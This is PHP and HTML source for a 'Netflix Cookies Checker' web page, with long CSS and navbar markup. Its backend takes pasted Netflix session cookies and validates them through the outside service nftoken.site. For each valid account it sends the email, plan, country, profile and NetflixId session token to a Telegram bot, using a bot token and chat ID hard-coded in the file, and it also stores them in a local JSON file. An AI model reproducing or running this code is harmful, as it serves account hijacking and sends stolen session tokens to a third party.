<?php
// 🔥 STEP 1: NO CACHE (PUT HERE FIRST)
//header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
//header("Pragma: no-cache");

// 🔥 STEP 2: SESSION + AUTH
//session_start();
//include "auth.php";
//requireLogin();


// 🔥 GET SAVED RESULTS API
if (isset($_GET['getSaved'])) {

    header('Content-Type: application/json');

    $file = "saved_results.json";

    if (!file_exists($file)) {
        echo json_encode([]);
        exit;
    }
    
    $data = json_decode(file_get_contents($file), true);
   if (!is_array($data)) $data = [];

   echo json_encode($data);
    exit;
}

putenv("TG_BOT_TOKEN=8151381339:AAHIxF0ERcB-u3fxcja99lObDozXjxoOKPk");
putenv("TG_CHAT_ID=6691379845");

function extractNetflixId($cookie) {
    if (!$cookie) return "N/A";

    // Match NetflixId
    if (preg_match('/NetflixId=([^;]+)/', $cookie, $match)) {
        return $match[1];
    }

    // Fallback SecureNetflixId
    if (preg_match('/SecureNetflixId=([^;]+)/', $cookie, $match)) {
        return $match[1];
    }

    return "N/A";
}

function sendToTelegram($text) {
    $botToken = getenv('TG_BOT_TOKEN');
    $chatId = getenv('TG_CHAT_ID');

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $postFields = [
        'chat_id' => $chatId,
        'text' => $text
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields,
        CURLOPT_TIMEOUT => 20
    ]);

    $response = curl_exec($ch);

    if ($response === false) {
        error_log("Telegram Error: " . curl_error($ch));
    }

    curl_close($ch);

    return $response;
}


function sendBulkFile($text) {
    $botToken = getenv('TG_BOT_TOKEN');
    $chatId = getenv('TG_CHAT_ID');

    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";

    $filePath = tempnam(sys_get_temp_dir(), 'bulk_') . '.txt';
    file_put_contents($filePath, $text);

    $postFields = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath),
        'caption' => "📦 Bulk Results"
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields,
        CURLOPT_TIMEOUT => 30
    ]);

    $response = curl_exec($ch);

    if ($response === false) {
        error_log("Bulk Telegram Error: " . curl_error($ch));
    }

    curl_close($ch);
    unlink($filePath);

return $response;
}

$bulkResults = [];


$raw = file_get_contents('php://input');
$json_data = json_decode($raw, true);

if (isset($data['bulk'])) {

    if (!empty($data['bulk'])) {
        $finalText = "📦 BULK RESULTS\n\n" . $data['bulk'];
        sendBulkFile($finalText);
    }

    http_response_code(204); // silent
    exit;
}

//ORIGINAL
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $raw_post_data = file_get_contents('php://input');
    $json_data = json_decode($raw_post_data, true);

   if (!isset($json_data['cookie'])) {
    http_response_code(400);
    echo json_encode(["error" => "No cookie provided"]);
    exit;
}

    $my_api_key = "NFK_54f66114f943657824650902";
    $api_url = "https://nftoken.site/v1/api.php";

    $payload = json_encode([
        'key' => $my_api_key,
        'cookie' => $json_data['cookie']
    ]);

    $ch = curl_init($api_url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 20
    ]);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if (!$response) {
        http_response_code(500);
        echo json_encode(["error" => "API failed"]);
        exit;
    }

    $decoded = json_decode($response, true);

    // ✅ ONLY process success
    if (isset($decoded['status']) && $decoded['status'] === 'SUCCESS') {

        $netflixId = extractNetflixId($json_data['cookie']);

        $msg =
"🎯 VALID ACCOUNT\n\n" .
"📧 Email: {$decoded['x_mail']}\n" .
"📋 Plan: {$decoded['x_tier']}\n" .
"🌍 Country: {$decoded['x_loc']}\n" .
"👤 Profile: {$decoded['x_usr']}\n\n" .
"💻 PC: {$decoded['x_l1']}\n" .
"📱 Mobile: {$decoded['x_l2']}\n" .
"📺 TV: {$decoded['x_l3']}\n\n" .
"🍪 NetflixId={$netflixId}\n" .
"━━━━━━━━━━━━━━━━━━━━";

        
        $bulkResults[] = $msg;
        
     // 🔥 NEW SAVE SYSTEM
    $result = [
        "email" => $decoded['x_mail'],
        "plan" => $decoded['x_tier'],
        "country" => $decoded['x_loc'],
        "profile" => $decoded['x_usr'],
        "netflixId" => $netflixId,
        "time" => date("Y-m-d H:i:s")
    ];

    $file = "saved_results.json";

    $existing = [];
    if (file_exists($file)) {
        $existing = json_decode(file_get_contents($file), true);
        if (!is_array($existing)) $existing = [];
    }
    
    // ✅ CHECK DUPLICATE (PUT HERE)
   $exists = false;

    foreach ($existing as $row) {
    if ($row['netflixId'] === $netflixId) {
        $exists = true;
        break;
       }
    }    
    if (!$exists) {
    $existing[] = $result;

    file_put_contents($file, json_encode($existing, JSON_PRETTY_PRINT));
  }
        
}

// return API response
http_response_code($http_code);
header('Content-Type: application/json');
echo json_encode($decoded);
exit;     
}    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybeat Premium Netflix Cookies Checker</title>
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
    body { 
        background: #2b2b2b; 
        color: #c9d1d9; 
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
        padding-top: 110px; /* space for fixed navbar */
    }

    .card { 
        background: #161b22; 
        border: 1px solid #30363d; 
        border-radius: 15px; 
    }

    textarea.form-control { 
        background: #2b2b2b; 
        border: 1px solid #30363d; 
        color: #c9d1d9; 
        border-radius: 12px; 
    }

    textarea.form-control:focus { 
        border-color: #58a6ff; 
        box-shadow: none; 
        outline: none; 
    }

    .btn { 
        border-radius: 50px; 
        font-weight: 600; 
    }

    .btn-success { background: #e50914; border: none; }

    .result-item { 
        border-bottom: 1px solid #30363d; 
        padding: 20px 0; 
    }

    .status-badge { 
        font-size: 11px; 
        padding: 4px 10px; 
        border-radius: 20px; 
        font-weight: bold; 
    }

    .fade-in { animation: fadeIn 0.3s ease; }

    @keyframes fadeIn { 
        from { opacity: 0; transform: translateY(5px); } 
        to { opacity: 1; transform: translateY(0); } 
    }
    
    /* MOBILE SAFE */
    @media (max-width: 576px) {
    body { padding-top: 130px; }
    }

    /* 🔥 MOBILE RESPONSIVENESS */
    @media (max-width: 576px) {

        body {
            padding-top: 110px; /* navbar wraps */
        }

        .navbar span {
            font-size: 20px !important;
        }

        .navbar img {
            width: 30px !important;
            height: 30px !important;
        }

        .container {
            margin-top: 20px; /* 👈 add this */
            padding-left: 10px;
            padding-right: 10px;
        }

        textarea.form-control {
            font-size: 14px;
        }

        #startBtn {
            padding: 12px;
            font-size: 14px;
        }

        /* Stack result buttons */
        .result-item .d-flex.justify-content-between {
            flex-direction: column;
        }

        .result-item .btn {
            margin: 4px 0 !important;
            width: 100% !important;
        }
    }

    /* EXTRA SMALL DEVICES */
    @media (max-width: 480px) {
        .navbar {
            padding: 8px;
        }

        .navbar span {
            font-size: 18px !important;
        }

        .card {
            padding: 15px !important;
        }
    }
    
.drop-zone {
    background: #161b22;
    border: 2px dashed #30363d;
    border-radius: 15px;
    padding: 30px;
    cursor: pointer;
    transition: all 0.2s ease;
    color: #8b949e;
}

.drop-zone:hover {
    border-color: #58a6ff;
    color: #c9d1d9;
}

.drop-zone.dragover {
    border-color: #58a6ff;
    background: #0d1117;
    color: #58a6ff;
}

.drop-zone i {
    display: block;
}    
    
.drop-zone.success {
    border-color: #22c55e;
    box-shadow: 0 0 15px rgba(34, 197, 94, 0.6);
    color: #22c55e;
}

@keyframes glowPulse {
    0% { box-shadow: 0 0 0 rgba(34,197,94,0); }
    50% { box-shadow: 0 0 20px rgba(34,197,94,0.8); }
    100% { box-shadow: 0 0 0 rgba(34,197,94,0); }
}

.drop-zone.animate-success {
    animation: glowPulse 0.6s ease;
}
    
/* NAV SCROLL ANIMATION */
.nav-marquee {
    overflow: hidden;
    white-space: nowrap;
    width: 100%;           /* 🔥 FULL WIDTH */
    max-width: 100%;
}

.nav-track {
    display: flex;
    width: max-content;
    animation: scrollNav 15s linear infinite;
}

.nav-item {
    margin-right: 80px; /* bigger gap = cleaner look */
}    
    
    
/* Add bounce to each item */
.nav-item {
    display: flex;
    align-items: center;
    margin-right: 40px;
    animation: floatY 2.5s ease-in-out infinite;
}

/* Slight delay for second copy → more natural motion */
.nav-item:nth-child(2) {
    animation-delay: 1.25s;
}

/* Horizontal scroll */
@keyframes scrollNav {
    0% {
        transform: translateX(0);
    }
    100% {
        transform: translateX(-25%); /* still smooth loop */
    }
}

/* Smooth premium bounce (VERY subtle) */
@keyframes floatY {
    0%, 100% {
        transform: translateY(0px);
    }
    50% {
        transform: translateY(-4px);
    }
}
}
.nav-item {
    display: flex;
    align-items: center;
    margin-right: 40px;
}    
.nav-item span {
    text-shadow: 0 0 8px rgba(217,119,6,0.6);
}    

@keyframes scrollNav {
    0% {
        transform: translateX(0%);
    }
    100% {
        transform: translateX(-50%);
    }
}    

@keyframes floatY {
    0%, 100% {
        transform: translateY(0px) scale(1);
    }
    50% {
        transform: translateY(-4px) scale(1.03);
    }
}    
    
.nav-item:hover {
    transform: scale(1.08);
    transition: transform 0.2s ease;
}    
  
.nav-item span {
    animation: glowPulse 3s ease-in-out infinite;
}

@keyframes glowPulse {
    0%, 100% {
        text-shadow: 0 0 6px rgba(217,119,6,0.4);
    }
    50% {
        text-shadow: 0 0 14px rgba(217,119,6,0.9);
    }
}    

/* 🔥 NFTOKEN BUTTON UPGRADE */
.nft-btn {
    position: relative;
    border: none;
    border-radius: 50px;
    font-weight: 700;
    font-size: 15px;
    color: #fff;
    background: linear-gradient(135deg, #e50914, #b20710);
    overflow: hidden;
    transition: all 0.25s ease;
    box-shadow: 0 0 12px rgba(229, 9, 20, 0.4);
}

/* Content stays above glow */
.nft-btn .btn-content {
    position: relative;
    z-index: 2;
}

/* Glow layer */
.nft-btn .btn-glow {
    position: absolute;
    top: 0;
    left: -50%;
    width: 200%;
    height: 100%;
    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.25), transparent);
    transform: skewX(-20deg);
    transition: 0.5s;
    /* ✅ GREEN when processing */
    }
    .nft-btn.loading {
    background: linear-gradient(135deg, #22c55e, #16a34a); /* green gradient */
    box-shadow: 0 0 15px rgba(34, 197, 94, 0.7);
}

/* Hover effect */
.nft-btn:hover {
    transform: translateY(-2px) scale(1.02);
    box-shadow: 0 0 20px rgba(229, 9, 20, 0.7);
}

.nft-btn:hover .btn-glow {
    left: 100%;
}

/* Click effect */
.nft-btn:active {
    transform: scale(0.98);
    box-shadow: 0 0 10px rgba(229, 9, 20, 0.5);
}

/* Optional: loading state (auto-ready if you use it later) */
.nft-btn.loading {
    pointer-events: none;
    opacity: 0.7;
}

.nft-btn.loading .btn-content::after {
    content: "...";
    margin-left: 6px;
    animation: dots 1s infinite;
}

@keyframes dots {
    0% { content: "."; }
    33% { content: ".."; }
    66% { content: "..."; }
}    
 
/* Spinner hidden by default */
.nft-btn .btn-spinner {
    display: none;
    position: relative;
    z-index: 2;
}

/* When loading */
.nft-btn.loading .btn-content {
    display: none;
}

.nft-btn.loading .btn-spinner {
    display: inline-flex;
    align-items: center;
    gap: 8px;
}

/* Optional smoother feel */
.nft-btn.loading {
    cursor: not-allowed;
    opacity: 0.85;
}    
 
/* 🔥 PREMIUM EXPORT BUTTON */
.export-btn {
    position: relative;
    border: none;
    border-radius: 50px;
    padding: 6px 14px;
    font-size: 12px;
    font-weight: 600;
    color: #fff;
    background: linear-gradient(135deg, #3b82f6, #2563eb); /* blue premium */
    overflow: hidden;
    transition: all 0.25s ease;
    box-shadow: 0 0 10px rgba(59, 130, 246, 0.4);
}

/* Keep text above glow */
.export-btn .export-content {
    position: relative;
    z-index: 2;
}

/* Glow animation */
.export-btn .export-glow {
    position: absolute;
    top: 0;
    left: -60%;
    width: 200%;
    height: 100%;
    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.25), transparent);
    transform: skewX(-20deg);
    transition: 0.6s;
}

/* Hover = premium shine */
.export-btn:hover {
    transform: translateY(-2px) scale(1.03);
    box-shadow: 0 0 18px rgba(59, 130, 246, 0.7);
}

.export-btn:hover .export-glow {
    left: 120%;
}

/* Click feedback */
.export-btn:active {
    transform: scale(0.96);
    box-shadow: 0 0 8px rgba(59, 130, 246, 0.5);
}

/* Disabled state */
.export-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}   
 
/* 🔥 PREMIUM TOAST */
.toast-success {
    position: fixed;
    bottom: 25px;
    right: 25px;
    background: linear-gradient(135deg, #22c55e, #16a34a);
    color: #fff;
    padding: 12px 18px;
    border-radius: 12px;
    font-size: 13px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 6px;
    box-shadow: 0 0 20px rgba(34, 197, 94, 0.5);
    
    opacity: 0;
    transform: translateY(20px) scale(0.95);
    pointer-events: none;
    transition: all 0.3s ease;
    z-index: 9999;
}    
/* SHOW STATE */
.toast-success.show {
    opacity: 1;
    transform: translateY(0) scale(1);
}

/* ❌ ERROR TOAST */
.toast-error {
    position: fixed;
    bottom: 25px;
    right: 25px;
    background: linear-gradient(135deg, #ef4444, #b91c1c);
    color: #fff;
    padding: 12px 18px;
    border-radius: 12px;
    font-size: 13px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 6px;
    box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);

    opacity: 0;
    transform: translateY(20px) scale(0.95);
    pointer-events: none;
    transition: all 0.3s ease;
    z-index: 9999;
}

.toast-error.show {
    opacity: 1;
    transform: translateY(0) scale(1);
}    
    
/* ICON ANIMATION */
.toast-success i {
    animation: pop 0.4s ease;
}

@keyframes pop {
    0% { transform: scale(0.5); }
    100% { transform: scale(1); }
}    

.result-box {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 14px;
    padding: 18px;
    margin-bottom: 15px;
    box-shadow: 0 0 10px rgba(0,0,0,0.4);
    transition: all 0.2s ease;
}

.result-box:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 20px rgba(88,166,255,0.2);
}    
  
.status-success {
    background: rgba(34, 197, 94, 0.15);
    color: #22c55e;
    border: 1px solid #22c55e;
    box-shadow: 0 0 8px rgba(34, 197, 94, 0.5);
}    

/* 🔥 MATCH RESULT-BOX GLOW */
.card, #instructionBlock {
    transition: all 0.2s ease;
}

/* HOVER = EXACT MATCH */
.card:hover, #instructionBlock:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 20px rgba(88,166,255,0.2) !important;
}

/* 🔥 FORCE SAME GLOW AS RESULT BOX */
.card, #instructionBlock {
    transition: all 0.2s ease;
    box-shadow: 0 0 10px rgba(0,0,0,0.4) !important; /* override bootstrap */
}

/* 🔥 APPLY SAME RESULT GLOW TO DROP ZONE */
.drop-zone {
    transition: all 0.2s ease;
}

/* SAME HOVER AS RESULT BOX */
.drop-zone:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 20px rgba(88,166,255,0.2);
}    

.drop-zone {
    box-shadow: 0 0 10px rgba(0,0,0,0.4);
}

/* 🔥 NAVBAR SAME GLOW AS RESULT BOX */
.navbar {
    transition: all 0.2s ease;
    box-shadow: 0 0 10px rgba(0,0,0,0.4); /* base like result-box */
}

/* HOVER = SAME GLOW */
.navbar:hover {
    box-shadow: 0 0 20px rgba(88,166,255,0.2);
}    

#confettiCanvas {
    position: fixed;
    top: 0;
    left: 0;
    pointer-events: none;
    width: 100%;
    height: 100%;
    z-index: 9999;
}    

/* 🔥 TEXTAREA GLOW = SAME AS DROP ZONE */
textarea.form-control {
    transition: all 0.2s ease;
    box-shadow: 0 0 10px rgba(0,0,0,0.4);
}

/* HOVER MATCH */
textarea.form-control:hover {
    transform: translateY(-2px);
    box-shadow: 0 0 20px rgba(88,166,255,0.2);
    border-color: #58a6ff;
} 
 
textarea.form-control:focus {
    border-color: #58a6ff;
    outline: none;
    transform: translateY(-2px);
    box-shadow: 0 0 20px rgba(88,166,255,0.35);
}
 
#homeBtn {
    transition: all 0.2s ease;
}    
 
/* 🔥 FLOATING BACK TO TOP BUTTON */
.back-to-top {
    position: fixed;
    bottom: 25px;
    right: 25px;
    z-index: 9999;

    background: linear-gradient(135deg, #ff7a00, #ff5500);
    color: #fff;
    border-radius: 50px;
    padding: 12px 16px;
    font-size: 14px;
    font-weight: 600;

    box-shadow: 0 0 12px rgba(88,166,255,0.4);
    transition: all 0.25s ease;

    opacity: 0;
    pointer-events: none;
    transform: translateY(20px);
}

/* SHOW */
.back-to-top.show {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0);
}

/* HOVER (same glow system 🔥) */
.back-to-top {
    box-shadow: 0 0 12px rgba(255, 122, 0, 0.4);
}
.back-to-top:hover {
    transform: translateY(-2px) scale(1.05);
    box-shadow: 0 0 20px rgba(255, 122, 0, 0.7);
}

/* CLICK FEEDBACK */
.back-to-top:active {
    transform: scale(0.95);
}    
 
.back-to-top::after {
    content: "Back to Top";
    margin-left: 10px;
    
    font-size: 13px;
    font-weight: 600;
    letter-spacing: 0.3px;

    color: #fff;
    background: rgba(0, 0, 0, 0.85);
    
    padding: 6px 10px;
    border-radius: 8px;

    box-shadow: 0 0 10px rgba(0,0,0,0.4);

    opacity: 0;
    transform: translateX(10px);
    transition: all 0.2s ease;

    white-space: nowrap;
}   

.back-to-top:hover::after {
    opacity: 1;
    transform: translateX(0);
}    

.exit-modal {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.75);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 99999;

    opacity: 0;
    pointer-events: none;
    transition: 0.25s ease;
}

.exit-modal.show {
    opacity: 1;
    pointer-events: auto;
}

.exit-box {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 16px;
    padding: 25px;
    text-align: center;
    width: 320px;

    box-shadow: 0 0 25px rgba(88,166,255,0.3);
}

.exit-box h4 {
    color: #ff7a00;
    margin-bottom: 10px;
}

.exit-box p {
    color: #c9d1d9;
    font-size: 13px;
}

.exit-actions {
    margin-top: 20px;
    display: flex;
    gap: 10px;
}

.exit-actions button {
    flex: 1;
    border: none;
    border-radius: 50px;
    padding: 10px;
    font-weight: 600;
    cursor: pointer;
}

#stayBtn {
    background: #22c55e;
    color: white;
}

#leaveBtn {
    background: #e50914;
    color: white;
}    

/* 🔥 STRONGER GLOW ON HOVER (SCAN BUTTON) */
#startBtn:hover {
    box-shadow: 
        0 0 10px rgba(88,166,255,0.6),
        0 0 20px rgba(88,166,255,0.8),
        0 0 35px rgba(88,166,255,1);
}

/* ✨ Optional pulse */
#startBtn:hover {
    animation: glowPulseBtn 1.2s ease-in-out infinite;
}

@keyframes glowPulseBtn {
    0%, 100% {
        box-shadow: 
            0 0 10px rgba(88,166,255,0.6),
            0 0 20px rgba(88,166,255,0.7);
    }
    50% {
        box-shadow: 
            0 0 20px rgba(88,166,255,0.9),
            0 0 40px rgba(88,166,255,1);
    }
}   

/* ✨ ULTRA PREMIUM CARD (RESPONSIVE FIX) */
.alert-box {
    backdrop-filter: blur(12px);
    background: rgba(20,20,20,0.85);
    border-radius: 16px;

    width: 90%;
    max-width: 360px;

    padding: 18px 16px;

    overflow: hidden;
    text-align: center;

    border: 1px solid rgba(255,255,255,0.08);
    box-shadow: 0 0 60px rgba(0,0,0,0.9);

    transform: scale(0.9);
    transition: all 0.25s ease;
}

/* 🟡 PREMIUM GLOW */
.alert-box.premium {
    box-shadow:
        0 0 20px rgba(255,215,0,0.3),
        0 0 40px rgba(255,215,0,0.2);
}

/* 📧 EMAIL STYLE */
.alert-email {
    font-size: 15px;
    font-weight: 600;
    color: #fff;
    margin-top: 6px;
}

/* 📋 PLAN BADGE */
.alert-plan {
    display: inline-block;
    margin-top: 6px;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 11px;
    font-weight: 600;
    background: #1f2937;
    color: #c9d1d9;
}

/* GOLD FOR PREMIUM */
.alert-plan.premium {
    background: linear-gradient(135deg, #facc15, #eab308);
    color: #000;
}

/* EXTRA INFO */
.alert-meta {
    font-size: 12px;
    color: #9ca3af;
    margin-top: 8px;
}

/* 🔴 TOP RED BAR */
.alert-bar {
    height: 5px;
    background: linear-gradient(90deg, #e50914, #b20710);
}

/* LOGO (CENTERED PERFECTLY) */
.alert-logo {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 16px 0 6px;
}

.alert-logo img {
    width: 42px;
    height: 42px;
    object-fit: contain;
}

/* ICON (BALANCED SPACING) */
.alert-icon {
    font-size: 28px;
    margin: 10px 0 6px;
}

/* TITLE */
.alert-title {
    font-size: 18px;
    font-weight: 700;
}

/* MESSAGE */
.alert-message {
    font-size: 13px;
    color: #aaa;
    margin: 10px 20px 20px;
}

.alert-modal.show {
    opacity: 1;
    pointer-events: auto;
}
    
.alert-modal.show .alert-box {
    transform: scale(1);
}

/* Title */
.alert-title {
    font-size: 20px;
    font-weight: 700;
    margin-bottom: 10px;
}

/* Message */
.alert-message {
    font-size: 13px;
    color: #aaa;
    margin-bottom: 20px;
}

/* Button */
.alert-btn {
    width: 100%;
    padding: 10px;
    border-radius: 50px;
    border: none;
    font-weight: 600;
    cursor: pointer;
}

/* SUCCESS STYLE */
.alert-success .alert-title {
    color: #22c55e;
}
.alert-success .alert-btn {
    background: #22c55e;
    color: #fff;
}

/* ERROR STYLE */
.alert-error .alert-title {
    color: #ef4444;
}
.alert-error .alert-btn {
    background: #e50914;
    color: #fff;
}    

.alert-modal {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.85);

    display: flex;
    align-items: center;
    justify-content: center;

    z-index: 99999;

    /* 🔥 THIS IS THE FIX */
    opacity: 0;
    pointer-events: none;
}    

#alertDetails {
    line-height: 1.6;
}

#alertDetails span {
    display: block;
    opacity: 0.9;
}    
  
@media (max-width: 480px) {
    .alert-title {
        font-size: 17px;
    }

    .alert-email {
        font-size: 14px;
    }

    .alert-plan {
        font-size: 10px;
        padding: 3px 8px;
    }

    .alert-meta {
        font-size: 11px;
    }

    .alert-message {
        font-size: 12px;
    }
}
    
</style>
</head>
<body> 

<body>
  <div id="top"></div>
    
<div class="container-fluid pb-3" style="max-width: 900px;">
<nav class="navbar navbar-expand-lg fixed-top" style="background: #161b22; border-bottom: 1px solid #30363d;">
  <div class="container-fluid px-0 d-flex flex-wrap align-items-center justify-content-between">

    <!-- LEFT -->
    <div class="d-flex align-items-center flex-wrap">

<!-- HOME BUTTON -->
<a href="#top" id="homeBtn" class="back-to-top">
    <i class="fas fa-arrow-up"></i>
</a>
        <!-- LOGO -->
       <div class="nav-marquee">
    <div class="nav-track">
        <!-- repeat this block 3–4 times -->
        <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>

        <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>

        <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>

        <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>

               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div> 
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>   
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>  
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>  
        
              <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>          
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>   
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>   
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>   
        
               <div class="nav-item d-flex align-items-center">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
                 style="width:45px; height:40px; margin-right:8px;">
            <span style="font-size: 25px; font-weight: bold; color:#white;">
                Cookies Checker
            </span>
        </div>           
        
    </div>
</div>
    </div>

    <!-- RIGHT -->
    <span style="font-size: 12px; color:#8b949e;" class="mb-1 text-right">
        Powered by: <b>Cybeat</b>
        <a href="logout.php" 
   style="
   color:#ff4d4d;
   font-weight:bold;
   padding:4px 10px;
   border-radius:20px;
   transition:0.2s;
   "
   onmouseover="this.style.boxShadow='0 0 10px rgba(239,68,68,0.7)'"
   onmouseout="this.style.boxShadow='none'">
   Logout
     </a>
   </span>

  </div>
</nav>
     <div class="card p-4 shadow-lg mb-4">
                <label class="font-weight-bold mb-2 text-[#28a745] d-flex align-items-center">
    <i class="fas fa-upload mr-2" style="color:#ffffff;"></i> 
    <span>Upload Cookies</span>
</label>           
                <div id="dropZone" class="drop-zone mb-3 text-center">
    <i class="fas fa-cloud-upload-alt mb-2" style="color:#8b949e; font-size: 28px;"></i>
    <p class="mb-1 font-weight-bold">Drag & Drop Cookie Files</p>
    <small class="text-muted">or click to browse (.txt, .json)</small>
    <input type="file" id="fileInput" multiple accept=".txt,.json" hidden>
</div>
                <div id="uploadProgressWrapper" style="display:none;">
    <div style="background:#2b2b2b; border-radius:10px; overflow:hidden; height:10px;">
        <div id="uploadProgressBar" 
             style="width:0%; height:100%; background:#58a6ff; transition:width 0.2s;">
        </div>
    </div>
    <small id="uploadProgressText" class="text-muted">0%</small>
</div>
                <label class="font-weight-bold mb-2 text-[#28a745] d-flex align-items-center">
    <i class="fas fa-paste mr-2" style="color:#ffffff;"></i> 
    <span>Paste Bulk Cookies</span>
</label>
                <textarea id="bulkInput" class="form-control mb-3" rows="6" placeholder="Paste JSON, Netscape, or Raw strings here..."></textarea>
<button id="startBtn" onclick="startApiTest()" 
    class="nft-btn w-100 py-3"
    title="Analyze cookies and generate secure access tokens">

    <!-- Default -->
    <span class="btn-content">
        <i class="fas fa-bolt mr-2"></i>
        <span class="btn-text">Scan & Generate Token</span>
    </span>

    <!-- Loading -->
   <span class="btn-spinner">
    <i class="fas fa-spinner fa-spin"></i> 
    <span id="btnProgressText">Processing...</span>
</span>

    <span class="btn-glow"></span>
</button>
            </div>

<div id="instructionBlock" class="mt-4 p-4 fade-in" style="background-color: #1a1c20; border: 1px dashed #444; border-radius: 15px;">
    <h6 class="text-white font-weight-bold mb-3" style="font-size: 14px; letter-spacing: 0.5px;">
        <i class="fas fa-info-circle text-danger mr-2"></i> Quick Guide & Instructions
    </h6>
    <ul class="text-muted mb-3 pl-4" style="font-size: 13px; line-height: 1.8; list-style-type: disc; margin: 0;">
        <li><strong>All Formats Supported:</strong> You can paste JSON, Netscape, Raw Strings, or HTTP Header Strings.</li>
        <li><strong>Check in Bulk:</strong> Paste as many cookies as you want. The smart parser automatically separates and counts them.</li>
    </ul>

<!-- How to Watch Button -->
<div class="text-center mt-3">
    <a href="guide.php" class="btn btn-danger px-4 py-2" 
       style="font-size: 13px; border-radius: 25px; font-weight: 600;"
       target="_blank">
